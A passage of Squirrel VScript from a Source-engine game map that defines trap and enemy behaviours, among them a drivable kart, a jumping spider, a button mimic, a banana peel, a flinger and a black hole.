							EntFireByHandle(phandle,"RunScriptCode","self.GetMoveParent().SetAngles(0,"+sty+",0);",0.10,null,null);
							self.SetVelocity(Vector());
							drive_vel_accel = 0.00;
							drive_vel = 0;
							drive_turn = 0;
						}
						else
							Clean(true);
					}
					if(getoncd > 0.00)getoncd -= 0.02;
					if(jumpcd > 0.00)jumpcd -= 0.02;
					if(::MOTHER_ZOMBIE_SPAWNED && !::ENDINGS.RACE.started)
					{
						if(phandle==null||!phandle.IsValid()){}else
						{
							if(phandle.GetTeam()==2&&phandle.IsAlive()==false)
							{
								::Sound("weapons/sensorgrenade/sensor_explode.wav",self.GetOrigin(),null,5000,0.10,RandomInt(170,200),10);
								::Ent(self.GetOrigin(),Vector(),"env_explosion",{
										//fireballsprite = "sprites/zerogxplode.spr", //__CSS__ this shouldnt be needed
										iMagnitude = 1,
										iRadiusOverride = 1,
										rendermode = 5,
										spawnflags = 2,
										rendercolor = "255 255 255",
									},{
									_user = phandle,
									function Run(){
										
										::ITEMS.bomb_chuck.explosion_owner = this._user;			//yoinked for killcreds
										::ITEMS.bomb_chuck.explosion_handle = self;					//yoinked for killcreds
										EntFireByHandle(self,"Explode","",0.00,null,null);
										EntFireByHandle(self,"Kill","",0.05,null,null);
										
									}});
								Clean(true);
							}
						}
					}
					if(phandle==null||!phandle.IsValid()||phandle.IsAlive()==false)
						{GetOff();if(getoncd<=0.00){for(local h;h=Entities.FindByClassnameWithin(
							h,"player",self.GetOrigin()+Vector(0,0,-10),10);)
								{if(h==null||!h.IsValid()||h.IsAlive()==false)continue;
									if(h.EyeAngles().x < 70)continue; //not looking down, don't get on
									GetOn(h);
								}}}
					else
					{
						
						//EntFireByHandle(phandle,"RunScriptCode","self.SetLocalOrigin(Vector(0,0,0))",0.00,null,null);
						//EntFireByHandle(phandle,"RunScriptCode","self.SetLocalOrigin(Vector(0,0,-40))",0.00,null,null);
						
						if(::IsKeyPressed(phandle,"CTRL"))
						{
							phandle.SetLocalOrigin(Vector(0,0,0));
							EntFireByHandle(phandle,"RunScriptCode","self.SetLocalOrigin(Vector(0,0,-40))",0.01,null,null);
						}
						else
							phandle.SetLocalOrigin(Vector(0,0,-40));
						
						
						//phandle.SetLocalOrigin(Vector(0,0,-40))		//<- this seems better against getting stuck while crouching
						//phandle.SetLocalOrigin(Vector(0,0,-40));
						//EntFireByHandle(phandle,"setlocalorigin","0 0 -40",0.00,null,null);
						
						
						EntFireByHandle(phandle,"AddOutput","movetype 0",0.00,null,null);
						EntFireByHandle(phandle,"SetParent","!activator",0.00,self,null);
						phandle.SetVelocity(Vector());
						if(phandle.GetTeam()==2 && phandle.GetHealth()>t_hpcap)
							phandle.SetHealth(t_hpcap);
					}
					local mdir = self.GetVelocity();
					mdir.Norm();
					mdir = ::AnglesToDir(::DirToAngles(self.GetForwardVector())+Vector(0,90,0))
					self.SetAngles(0,(::DirToAngles(self.GetForwardVector())+Vector(0,drive_turn,0)).y,0);
					
					
					if(!::TRAPS.kart.new_controls)
					{
						drive_vel += ::TRAPS.kart.drive_vel_baseadd*drive_vel_accel;
						if(drive_vel<0)drive_vel=0;
						else
						{
							if(jumpcd > 0.00 && drive_vel>180)drive_vel = 180;
							else if(drive_vel>::TRAPS.kart.velocity_cap)drive_vel=(0.00+::TRAPS.kart.velocity_cap);
						}
					}
					else
					{
						if(phandle == null)
						{
							local deaccel_rate = 3.00;
							if(drive_vel_accel > 0){drive_vel_accel -= deaccel_rate;if(drive_vel_accel < 0)drive_vel_accel=0.00;}
							else if(drive_vel_accel < 0){drive_vel_accel += deaccel_rate;if(drive_vel_accel > 0)drive_vel_accel=0.00;}
						}
						drive_vel = drive_vel_accel;
					}
					local zvel = self.GetVelocity().z;
					if(!::TRAPS.kart.enable_jumping)
					{
						jump = false;
						jumpcd = 0.00;
					}
					if(jump && jumpcd <= 0.00)
					{
						zvel = 700;
						jumpcd = 2.00;
					}
					
					if(::TRAPS.kart.new_controls)
						self.SetVelocity((self.GetLeftVector() * -drive_vel)+Vector(0,0,zvel));
					else
						self.SetVelocity((mdir*drive_vel)+Vector(0,0,zvel));
						
					
				},function Run(){
					self.SetModel("models/luffaren/luffaren_kart.mdl");
					::CreateCostCleaner(self,1);
					EntFireByHandle(self,"RunScriptCode","Tick();",0.40,null,null);
					
					//__CSS__ new controls:
					if(::TRAPS.kart.new_controls)
						AddThinkToEnt(self,"TickSteeringNew");
					else
						EntFireByHandle(self,"RunScriptCode","TickPlayerLook();",0.40,null,null);
					
					EntFireByHandle(self,"RunScriptCode","TickElevatorSlay();",0.40,null,null);
					EntFireByHandle(self,"AddOutput","modelscale 1.00",0.00,null,null);
					EntFireByHandle(self,"AddOutput","material 3",0.00,null,null);
					EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(1);",0.00,null,null);
					EntFireByHandle(self,"AddOutput","friction 0.01",0.00,null,null);
					EntFireByHandle(self,"AddOutput","mins -35 -17 -12",0.02,null,null);
					EntFireByHandle(self,"AddOutput","maxs 25 17 30",0.02,null,null);
					if(start_frozen)EntFireByHandle(self,"AddOutput","movetype 0",0.02,null,null);
					else EntFireByHandle(self,"AddOutput","movetype 3",0.02,null,null);
					EntFireByHandle(self,"AddOutput","gravity 1.00",0.02,null,null);
					self.__KeyValueFromVector("rendercolor",Vector(RandomInt(0,255),RandomInt(0,255),RandomInt(0,255)));
					if(phandle==null||!phandle.IsValid()){}else{local ppp = phandle;phandle=null;GetOn(ppp);}
				}});
		}
	},
	thigh_spider = {
			tickrate = 0.05,
			tickrate_idle = 2.00,
			target_range = 500,
			target_lose_range = 1000,
			bite_range = 50,
			bite_damage = 3,
			bite_delaybuffer = 4,
			jump_range = 400,
			jump_timeout = 70,
			jump_nudge_delay = 0.80,
			jump_nudge_force = 20,
			jump_after_first = true,
			jump_speed = 500,
			jump_height = 300,
			jump_height_high = 700,
			jump_height_high_height = 70,
			hp_base = 300,
			hp_each_ct = 100,
		function Spawn(pos,rot=null){
			if(rot==null)rot = Vector(0,RandomFloat(0,360),0);
			::Ent(pos,rot,"hegrenade_projectile",{
					rendermode = 1,
					renderamt = 0,
				},{
				function TargetPlayer(_target){
					target = _target;
					::Sound("*luffaren/shellbert_despair.mp3",Vector(0,0,15),self,6000,1.50,RandomInt(40,50),10);
				},function Die(){
					if(dead)return;
					dead = true;
					EntFireByHandle(model,"SetAnimation","dead",0.00,null,null);
					EntFireByHandle(model,"SetDefaultAnimation","dead",0.01,null,null);
					//EntFireByHandle(model,"fadeandkill","3",7.00,null,null);
					::FadeAndKill(model,3.00,7.00);		//__CSS__ fadeandkill doesn't exist in css
					EntFireByHandle(self,"Kill","0",10.05,null,null);
					self.SetVelocity(Vector(0,0,-300));
					standanim = true;
					jumptime = 0;
					pitch = 0;
					jumping = false;
					::Sound("*luffaren/shellbert_despair.mp3",Vector(0,0,15),self,5000,2.00,RandomInt(30,35),10);
					::Sound("*luffaren/eyelid_flesh.mp3",Vector(0,0,15),self,5000,2.00,RandomInt(30,35),10);
					::Sound("*luffaren/eyelid_flesh.mp3",Vector(0,0,15),self,5000,2.00,RandomInt(60,70),10);
				},function Tick(){
					if(dead)return;
					local tick_called = false;
					try{
						if(self.GetOrigin().z < -11000)Die();
						EntFireByHandle(self,"Wake","",0.00,null,null);
						self.SetAngles(0,yaw,0);
						if(target==null||!target.IsValid()||target.GetTeam()!=3||target.IsAlive()==false||
						::GetDistance(target.GetOrigin(),self.GetOrigin())>::TRAPS.thigh_spider.target_lose_range)
						{
							target = null;
							if(biting)
							{
								self.SetVelocity(Vector(0,0,-300));
								EntFireByHandle(model,"SetAnimation","idle",0.00,null,null);
								EntFireByHandle(model,"SetDefaultAnimation","idle",0.01,null,null);
								standanim = true;
								jumptime = 0;
								pitch = 0;
								jumping = false;
							}
							biting = false;
							jumped_once = false;
							local candidates = [];
							for(local h;h=Entities.FindByClassnameWithin(h,"player",self.GetOrigin(),::TRAPS.thigh_spider.target_range);)
							{
								if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
								if(TraceLinePlayersIncluded(self.GetOrigin()+Vector(0,0,30),h.GetOrigin()+Vector(0,0,40),h)<1.00)continue;
								candidates.push(h);
							}
							if(candidates.len()>0)
							{
								TargetPlayer(candidates[RandomInt(0,candidates.len()-1)]);
							}
						}
						tick_called = true;
						if(target==null)
							EntFireByHandle(self,"RunScriptCode","Tick();",::TRAPS.thigh_spider.tickrate_idle,null,null);
						else
							EntFireByHandle(self,"RunScriptCode","Tick();",::TRAPS.thigh_spider.tickrate,null,null);
						if(target!=null)
						{
							EntFireByHandle(model,"AddOutput","body 1",0.00,null,null);
							local dir = (target.GetOrigin()+Vector(0,0,40))-(self.GetOrigin()+Vector(0,0,15));
							dir.Norm();
							yaw = ::DirToAngles(dir).y;
							if(!biting && ::GetDistance(self.GetOrigin()+Vector(0,0,15),target.GetOrigin()+Vector(0,0,30))<=::TRAPS.thigh_spider.bite_range)
							{
								biting = true;
								bite_offset = (::AnglesToDir(Vector(0,RandomFloat(0,360),0))*20)+Vector(0,0,RandomFloat(20,25));
								EntFireByHandle(model,"SetAnimation","stuck",0.00,null,null);
								EntFireByHandle(model,"SetDefaultAnimation","stuck",0.01,null,null);
								::Sound("*luffaren/shellbert_despair.mp3",self.GetOrigin()+Vector(0,0,15),null,1000,0.04,RandomInt(200,220),10);
								::Sound("*luffaren/shellbert_despair.mp3",self.GetOrigin()+Vector(0,0,15),null,1000,0.04,RandomInt(240,255),10);
							}
							if(biting)
							{
								self.SetOrigin(target.GetOrigin()+bite_offset);
								self.SetVelocity(Vector());
								pitch = ::DirToAngles(dir).x;
								bite_buffer++;
								if(bite_buffer > ::TRAPS.thigh_spider.bite_delaybuffer)
								{
									bite_buffer = 0;
									local newhp = target.GetHealth()-::TRAPS.thigh_spider.bite_damage;
									EntFireByHandle(target,"SetHealth",newhp.tostring(),0.00,null,null);
									::Particle("blood_advisor_puncture_withdraw",target.GetOrigin()+Vector(0,0,35),Vector(90+RandomInt(-15,15),RandomInt(0,360),RandomInt(-15,15)),null,0.05);
								}
								::Sound("*luffaren/eyelid_flesh.mp3",target.GetOrigin()+Vector(0,0,35),null,1000,0.04,RandomInt(170,180),10);
								local tvel = target.GetVelocity();
								tvel.x = 0;
								tvel.y = 0;
								if(tvel.z > 0)tvel.z = 0;
								target.SetVelocity(tvel);
							}
							else
							{
								local jrange = (0+::TRAPS.thigh_spider.jump_range);
								if(jumped_once && ::TRAPS.thigh_spider.jump_after_first)jrange = 99999;
								if(!jumping && ::GetDistance(target.GetOrigin(),self.GetOrigin())<=jrange)
								{
									jumping = true;
									jumped_once = true;
									standanim = false;
									::Sound("*luffaren/shellbert_despair.mp3",self.GetOrigin()+Vector(0,0,15),null,5000,0.04,RandomInt(130,140),10);
									local jumptime = RandomFloat(1.50,3.00);
									self.SetOrigin(self.GetOrigin()+Vector(0,0,1));
									EntFireByHandle(model,"SetAnimation","jumping",0.00,null,null);
									EntFireByHandle(model,"SetDefaultAnimation","jumping",0.01,null,null);
									dir.z = 0.00;
									dir.Norm();
									local jheight = (0+::TRAPS.thigh_spider.jump_height);
									if(target.GetOrigin().z > self.GetOrigin().z+::TRAPS.thigh_spider.jump_height_high_height)jheight = (0+::TRAPS.thigh_spider.jump_height_high);
									self.SetVelocity((dir*::TRAPS.thigh_spider.jump_speed)+Vector(0,0,jheight));
									nudge_buffer = (dir*::TRAPS.thigh_spider.jump_nudge_force);
									EntFireByHandle(self,"RunScriptCode","self.SetVelocity(self.GetVelocity()+nudge_buffer);",::TRAPS.thigh_spider.jump_nudge_delay,null,null);
								}
								else
								{
									if(jumping)
									{
										pitch = ::DirToAngles(dir).x;
										jumptime++;
									}
									if(!standanim)
									{
										if(jumptime>::TRAPS.thigh_spider.jump_timeout||
										TraceLinePlayersIncluded(self.GetOrigin()+Vector(0,0,2),self.GetOrigin()+Vector(0,0,-5),self)<1.00)
										{
											EntFireByHandle(model,"SetAnimation","idle",0.00,null,null);
											EntFireByHandle(model,"SetDefaultAnimation","idle",0.01,null,null);
											standanim = true;
											jumptime = 0;
											pitch = 0;
											EntFireByHandle(self,"RunScriptCode","jumping=false;",RandomFloat(0.40,0.50),null,null);
										}
									}
								}
							}
						}
						else
							EntFireByHandle(model,"AddOutput","body 0",0.00,null,null);
						self.SetAngles(pitch,yaw,0);
					}catch(e){printl("[::TRAPS.thigh_spider ERROR]: "+e);}
					if(!tick_called)EntFireByHandle(self,"RunScriptCode","Tick();",::TRAPS.thigh_spider.tickrate,null,null);
				},
				dead = false,
				bite_offset = Vector(),
				yaw = rot.y,
				pitch = 0,
				target = null,
				jumping = false,
				jumptime = 0,
				jumped_once = false,
				standanim = true,
				model = null,
				biting = false,
				nudge_buffer = Vector(),
				bite_buffer = 0,
				function Run(){
					self.SetSize(Vector(-10,-10,0),Vector(10,10,15));
					EntFireByHandle(self,"AddOutput","material 3",0.00,null,null);
					EntFireByHandle(self,"AddOutput","friction 2",0.00,null,null);
					EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(3);",0.00,null,null);
					EntFireByHandle(self,"AddOutput","movetype 0",0.00,null,null);
					EntFireByHandle(self,"AddOutput","movetype 3",0.93,null,null);
					EntFireByHandle(self,"RunScriptCode","Tick();",0.95,null,null);
					//::manager.PrecacheModel("models/luffaren/thigh_spider.mdl");
					::Ent(self.GetOrigin()+Vector(0,0,15),self.GetAngles(),"prop_dynamic",{
							model="models/luffaren/thigh_spider.mdl",
							modelscale = 1.50,
						},{
						master = self,
						function Run(){
						::CreateCostCleaner(self,2);
						::CreateTemCleaner(self,{
							master=master,
							model=self,
							function Clean(){
								if(model==null||!model.IsValid()){}else EntFireByHandle(model,"Kill","",0.00,null,null);
								if(master==null||!master.IsValid()){}else EntFireByHandle(master,"Kill","",0.00,null,null);
							}});
						master.GetScriptScope().model = self;
						EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
						EntFireByHandle(self,"SetAnimation","idle",0.00,null,null);
						EntFireByHandle(self,"SetDefaultAnimation","idle",0.02,null,null);
					}});
					local hp = (0+::TRAPS.thigh_spider.hp_base);
					::GetPlayerCount();
					hp += (::getplayercount_cache_ct*::TRAPS.thigh_spider.hp_each_ct);
					::Hitbox(self.GetOrigin(),self.GetAngles(),hp,Vector(-12,-12,-2),Vector(12,12,38),"filter_ct",false,{
						master = self,
						hitcd = false,
						function Act(index,attackerhandle){
								//printl("index(1:init|2:damaged|3:broken|4:healed):"+index+"|"+hitboxhandle+"|"+attackerhandle);
							if(index==1)EntFireByHandle(hitboxhandle,"SetParent","!activator",0.00,master,null);
							else if(index==2)
							{
								if(master.GetScriptScope().target==null)
								{
									if(::GetDistance(attackerhandle.GetOrigin(),master.GetOrigin())<::TRAPS.thigh_spider.target_lose_range)
									{
										master.GetScriptScope().TargetPlayer(attackerhandle);
																				//x-jumped_once was here in v1_7
									}
								}
								master.GetScriptScope().jumped_once = true;		//x-jumped_once here in v1_7
								if(hitcd)return;
								hitcd = true;
								EntFireByHandle(hitboxhandle,"RunScriptCode","logic.hitcd = false;",0.10,null,null);
								EntFireByHandle(master.GetScriptScope().model,"AddOutput","rendercolor 255 70 70",0.00,null,null);
								EntFireByHandle(master.GetScriptScope().model,"AddOutput","rendercolor 255 255 255",0.05,null,null);
							}
							else if(index==3)
								master.GetScriptScope().Die();
						}},"hitbox_thigh_spider");
			}});
		}
	},
	buttonmimic = {
			tint = "255 150 150",
			tint_generic = "255 150 150",
			print_chat = true,
		function Spawn(pos,rot=null){
			if(rot==null)
			{
				local rots = [0,90,180,270];
				rot = Vector(0,rots[RandomInt(0,rots.len()-1)],0);
			}
			local model = ::TILEVARIANTS["BUTTON_1"][::THEME].main[RandomInt(0,::TILEVARIANTS["BUTTON_1"][::THEME].main.len()-1)];
			local rendercolor = ""+::TRAPS.buttonmimic.tint;
			if(::THEME=="generic")rendercolor = ""+::TRAPS.buttonmimic.tint_generic;
			//::manager.PrecacheModel(model);
			::Ent(pos,rot,"prop_physics_override",{
					model=model,
					spawnflags = 266,
					rendermode = 1,
					renderamt = 255,
					rendercolor = rendercolor,
					DisableBoneFollowers = true,
				},{
				used = false,
				is_buttonmodel = true,
				function InputUse(){
					if(used)return;
					local user = activator;
					if(user==null||!user.IsValid()||user.GetTeam()!=3||user.IsAlive()==false)return;
					used = true;
					EntFireByHandle(self,"AddOutput","renderamt 240",0.00,null,null);
					EntFireByHandle(self,"AddOutput","renderamt 200",0.05,null,null);
					EntFireByHandle(self,"AddOutput","renderamt 160",0.10,null,null);
					EntFireByHandle(self,"AddOutput","renderamt 120",0.15,null,null);
					EntFireByHandle(self,"AddOutput","renderamt 80",0.20,null,null);
					EntFireByHandle(self,"AddOutput","renderamt 40",0.25,null,null);
					EntFireByHandle(self,"AddOutput","renderamt 10",0.30,null,null);
					EntFireByHandle(self,"Kill","",0.35,null,null);
					if(::TRAPS.buttonmimic.print_chat)::PlayerNameMessage(user,"Beware button-mimics! ("," fell for it)");
					else ::ServerSay("say Beware button-mimics!",0.00,null);
					EntFireByHandle(user,"SetHealth","-1",0.00,null,null);
					::Sound("*luffaren/pizza_splotion.mp3",self.GetOrigin()+Vector(0,0,8),null,2000,0.10,RandomInt(40,50),100);
					::Sound("*luffaren/sliced.mp3",self.GetOrigin()+Vector(0,0,8),null,5000,0.10,RandomInt(200,255),100);
					::Particle("blood_advisor_puncture_withdraw",user.GetOrigin(),Vector(90+RandomInt(-15,15),RandomInt(0,360),RandomInt(-15,15)),null,0.10);
					::Particle("blood_spurt_synth_01",self.GetOrigin(),Vector(),null,0.03);
					::Ent(Vector(user.GetOrigin().x,user.GetOrigin().y,self.GetOrigin().z-8),Vector(0,RandomFloat(0,360),0),"prop_dynamic",{
							model="models/luffaren/beartrap.mdl",
							modelscale = 1.80,
							rendermode = 1,
							renderamt = 50,
							rendercolor = "255 0 0",
							glowenabled = 0,
							glowdist = 1000,
							glowstyle = 1,
							glowcolor = "100 0 0",
							StartDisabled = "1",
						},{
						function Run(){
							EntFireByHandle(self,"Enable","",0.00,null,null);
							EntFireByHandle(self,"AddOutput","glowenabled 1",0.00,null,null);
							EntFireByHandle(self,"SetAnimation","snap",0.01,null,null);
							EntFireByHandle(self,"SetDefaultAnimation","snapped",0.03,null,null);
							//EntFireByHandle(self,"fadeandkill","0.2",0.30,null,null);
							::FadeAndKill(self,0.2,0.3);		//__CSS__ fadeandkill doesn't exist in css
						}});
				},
				function Run(){
					Inputuse <- InputUse;
					::CreateCostCleaner(self,1);
					::CreateTemCleaner(self,{
						main=self,
						function Clean(){
							if(main==null||!main.IsValid()){}else EntFireByHandle(main,"Kill","",0.00,null,null);
						}});
				}});
		}
	},
	banana = {
			rot_target = 2000,
			rot_rate = 0.01,
			rot_amount = 5,
			sound_time = 4.20,
			print_chat = true,
		function Spawn(pos,rot=null){
			if(rot==null)rot = Vector(0,RandomFloat(0,360),0);
			//::manager.PrecacheModel("models/luffaren/ck_banana.mdl");
			::Ent(pos,rot,"prop_dynamic",{
					model="models/luffaren/ck_banana.mdl",
					modelscale = 0.80,
				},{
				function Run(){
				::CreateCostCleaner(self,2);
				::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
						spawnflags = 1,
						filtername = "filter_ct",
					},{
					model = self,
					touched = false,
					function Touch(){
						if(touched)return;
						touched = true;
						local toucher = activator;	//__CSS__ activator may get reset, store toucher
						EntFireByHandle(self,"Kill","",0.00,null,null);
						EntFireByHandle(model,"Kill","",0.00,null,null);
						::NullifyFalldownCheckpoint(toucher,null,10,0.40);		//10*0.40 = 4s (should be pretty alright)
						local ii = 0.00;
						local vel = toucher.GetVelocity();
						vel.z = 0.00;
						toucher.ValidateScriptScope();
						local yaw = self.GetAngles().y;
						local targetyaw = ::TRAPS.banana.rot_target+yaw;
						toucher.GetScriptScope().banana_vel <- vel;
						toucher.GetScriptScope().banana_yaw <- yaw;
						local sd = "+";
						if(RandomInt(0,1)==0)sd = "-";
						for(yaw;yaw<targetyaw;yaw+=::TRAPS.banana.rot_amount)
						{
							EntFireByHandle(toucher,"RunScriptCode","banana_yaw"+sd+"=::TRAPS.banana.rot_amount;self.SetAngles(0,banana_yaw,0);",ii,null,null);
							EntFireByHandle(toucher,"RunScriptCode","self.SetVelocity(Vector(banana_vel.x,banana_vel.y,self.GetVelocity().z));",ii,null,null);
							ii += ::TRAPS.banana.rot_rate;
						}
						::Sound("*luffaren/banana_slip.mp3",Vector(0,0,8),toucher,10000,::TRAPS.banana.sound_time+0.20,RandomInt(90,100),100,{
							function Run(){
								EntFireByHandle(soundhandle,"StopSound","",::TRAPS.banana.sound_time,null,null);
								EntFireByHandle(soundhandle,"Volume","0",::TRAPS.banana.sound_time,null,null);
								EntFireByHandle(soundhandle,"Kill","",::TRAPS.banana.sound_time+0.05,null,null);
							}});
						::Particle("muzzle_rifles",toucher.GetOrigin(),Vector(90+RandomInt(-15,15),RandomInt(0,360),RandomInt(-15,15)),null,0.05);
						if(::TRAPS.banana.print_chat)::PlayerNameMessage(toucher,""," slipped on a banana peel");
					},function Run(){
						::CreateTemCleaner(self,{
							model=model,
							trigger=self,
							function Clean(){
								if(model==null||!model.IsValid()){}else EntFireByHandle(model,"Kill","",0.00,null,null);
								if(trigger==null||!trigger.IsValid()){}else EntFireByHandle(trigger,"Kill","",0.00,null,null);
							}});
						EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						EntFireByHandle(self,"AddOutput","mins -2 -2 -1",0.00,null,null);
						EntFireByHandle(self,"AddOutput","maxs 2 2 2",0.00,null,null);
						EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
						EntFireByHandle(self,"Enable","",0.10,null,null);
					}});
			}});
		}
	},
	flinger = {
			trigger_size = 150,
			fling_radius = 600,
			fling_force = 1700,		//__CSS__ og 1400 which seems too weak in css
			fling_zmin = 300,
			fling_zmax = 700,
			print_chat = true,
		function Spawn(pos,rot=null){
			if(rot==null)rot = Vector(0,RandomFloat(0,360),0);
			//::manager.PrecacheModel("models/luffaren/heal_orb.mdl");
			::Ent(pos+Vector(0,0,0),rot,"prop_dynamic",{
					model="models/luffaren/heal_orb.mdl",
					modelscale = 0.80,
					rendermode = 3,
					renderamt = 255,
					rendercolor = "255 0 0",
				},{
				gottakill = false,
				function Tick(){
					if(gottakill)
					{
						EntFireByHandle(self,"Kill","",0.00,null,null);
						return;
					}
					EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.03,null,null);
					local newang = Vector(-90,self.GetAngles().y+25,0);
					if(newang.y>360)newang.y-=360;
					self.SetAngles(newang.x,newang.y,newang.z);
				},function Run(){
				::CreateCostCleaner(self,2);
				EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.03,null,null);
				::Ent(self.GetOrigin(),Vector(0,self.GetAngles(),0),"trigger_multiple",{
						spawnflags = 1,
						filtername = "filter_ct",
					},{
					model = self,
					touched = false,
					function Touch(){
						if(touched)return;
						touched = true;
						local toucher = activator;	//__CSS__ activator may get reset, store toucher
						EntFireByHandle(self,"Kill","",0.00,null,null);
						local ii = 0.00;
						local alpha = 255;
						for(local scale = 0.80;scale<3.00;scale += 0.20)
						{
							EntFireByHandle(model,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
							EntFireByHandle(model,"AddOutput","modelscale "+scale.tostring(),ii,null,null);
							alpha -= 25;
							if(alpha<0)alpha = 0;
							ii += 0.02;
						}
						EntFireByHandle(model,"RunScriptCode"," gottakill = true; ",ii,null,null);
						::Fling(self.GetOrigin(),::TRAPS.flinger.fling_radius,::TRAPS.flinger.fling_force,true,null,
							::TRAPS.flinger.fling_zmin,::TRAPS.flinger.fling_zmax,3);
						::Sound("*luffaren/fling_item.mp3",self.GetOrigin(),null,10000,0.50,RandomInt(60,70),10);
						::Sound("*luffaren/fling_item.mp3",self.GetOrigin(),null,10000,0.50,RandomInt(98,102),10);
						if(::TRAPS.flinger.print_chat)::PlayerNameMessage(toucher,""," triggered a flinger");
					},function Run(){
						::CreateTemCleaner(self,{
							model=model,
							trigger=self,
							function Clean(){
								if(model==null||!model.IsValid()){}else EntFireByHandle(model,"Kill","",0.00,null,null);
								if(trigger==null||!trigger.IsValid()){}else EntFireByHandle(trigger,"Kill","",0.00,null,null);
							}});
						EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						local tz = (0+::TRAPS.flinger.trigger_size).tostring();
						EntFireByHandle(self,"AddOutput","mins -"+tz+" -"+tz+" -100",0.00,null,null);
						EntFireByHandle(self,"AddOutput","maxs "+tz+" "+tz+" 200",0.00,null,null);
						EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:1",0.00,null,null);
						EntFireByHandle(self,"Enable","",0.10,null,null);
					}});
			}});
		}
	},
	blackhole = {
			tickrate = 0.20,
			suck_multiplier = 0.90,
			suck_killdist = 50,
			suck_range = 500.00,
			suck_modelscale = 3.00,
			suck_battery = 1000.00,
			suck_battery_drain_kill = 700.00,
			suck_battery_drain_distmult = 1.00,
			ct_only = true,
			print_chat = true,
		function Spawn(pos){
			//::manager.PrecacheModel("models/luffaren/heal_orb.mdl");
			::Ent(pos,Vector(),"prop_dynamic",{
					model="models/luffaren/heal_orb.mdl",
					modelscale = 0.90,
					rendermode = 3,
					glowenabled = 1,
					glowstyle = 1,
					glowdist = 20000,
					glowcolor = "10 0 5",
					rendercolor = "0 0 0",
				},{
				battery = (0.00+::TRAPS.blackhole.suck_battery),
				ticking = true,
				function Tick(){
					if(!ticking)
					{
						EntFireByHandle(self,"Kill","",0.00,null,null);
						return;
					}
					EntFireByHandle(self,"RunScriptCode"," Tick(); ",::TRAPS.blackhole.tickrate,null,null);
					if(battery<=0.00){ticking=false;return;}
					for(local h;h=Entities.FindByClassnameWithin(h,"player",self.GetOrigin(),::TRAPS.blackhole.suck_range);)
					{
						if(h==null||!h.IsValid()||h.IsAlive()==false)continue;
						if(::TRAPS.blackhole.ct_only && h.GetTeam()!=3)continue;
						else if(h.GetTeam()==2)
						{
							h.ValidateScriptScope();
							if("invincible" in h.GetScriptScope())continue;
						}
						local dist = ::GetDistance(h.GetOrigin(),self.GetOrigin());
						if(dist<=::TRAPS.blackhole.suck_killdist)
						{
							battery -= ::TRAPS.blackhole.suck_battery_drain_kill;
							if(h.GetTeam()==3)EntFireByHandle(h,"SetHealth","-1",0.00,null,null);
							else if(h.GetTeam()==2)h.SetOrigin(Vector(0,0,-16160));
							::Sound("*luffaren/roar.mp3",self.GetOrigin(),null,5000,0.05,RandomInt(240,255),10);
							if(::TRAPS.blackhole.print_chat)::PlayerNameMessage(h,""," got sucked into a black hole");
							continue;
						}
						local suck_force = ((((0.00+::TRAPS.blackhole.suck_range)-dist)*1.00)*::TRAPS.blackhole.suck_multiplier);
						local dir = self.GetOrigin()-h.GetOrigin();
						dir.Norm();
						h.SetVelocity(h.GetVelocity()+(dir*suck_force));
						battery -= ((((0.00+::TRAPS.blackhole.suck_range)-dist)*0.10)*::TRAPS.blackhole.suck_battery_drain_distmult);
					}
					::Sound("*luffaren/whip_me_daddy.mp3",self.GetOrigin(),null,5000,0.05,RandomInt(25,35),2);
					::Ent(self.GetOrigin(),Vector(RandomFloat(0,360),RandomFloat(0,360),RandomFloat(0,360)),"prop_dynamic",{
							model="models/luffaren/heal_orb.mdl",
							modelscale = (0.00+::TRAPS.blackhole.suck_modelscale),
							rendermode = 3,
							renderamt = 0,
							rendercolor = "0 0 0",
						},{
						master = self,
						ticking = true,
						alpha = 0,
						scale = (0.00+::TRAPS.blackhole.suck_modelscale),
						function Tick(){
							if(!ticking)
							{
								EntFireByHandle(self,"Kill","",0.00,null,null);
								return;
							}
							EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.02,null,null);
							alpha += RandomInt(3,7);
							scale -= RandomFloat(0.05,0.15);
							self.__KeyValueFromInt("renderamt",alpha);
							self.__KeyValueFromFloat("modelscale",scale);
							if(scale<=0.90)ticking = false;
						},function Run(){
							EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.00,null,null);
						}});
				},function Run(){
					::CreateCostCleaner(self,7);
					::CreateTemCleaner(self,{
						model=self,
						function Clean(){
							if(model==null||!model.IsValid()){}else EntFireByHandle(model,"Kill","",0.00,null,null);
						}});
					EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.10,null,null);
					for(local i=0;i<3;i++)
					{
						::Ent(self.GetOrigin(),Vector(RandomFloat(0,360),RandomFloat(0,360),RandomFloat(0,360)),"prop_dynamic",{
								model="models/luffaren/heal_orb.mdl",
								modelscale = 0.90,
								rendermode = 1,
								rendercolor = "0 0 0",
							},{
							master = self,
							function Run(){
								EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
							}});
					}
				}});
		}
	},
	spikes = {
			damage_run = 23,
			damage_fall = 132,
			speed_run = 150,
			speed_fall = 50,
			print_chat = true,
		function Spawn(pos,rot=null){
			if(rot==null)
			{
				local rots = [0,90,180,270];
				rot = Vector(0,rots[RandomInt(0,rots.len()-1)],0);
			}
			//::manager.PrecacheModel("models/luffaren/spikes.mdl");
			::Ent(pos,rot,"prop_dynamic",{
					model="models/luffaren/spikes.mdl",
					modelscale = 2.10,		//__CSS__ og was 4.90, but it made it waay too big
				},{
				function Run(){
				::CreateCostCleaner(self,2);
				::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
						spawnflags = 1,
						filtername = "filter_ct",
					},{
					model = self,
					function Think(){
						self.AcceptInput("Toggle","",null,null);
						return -1;
					},function Touch(){
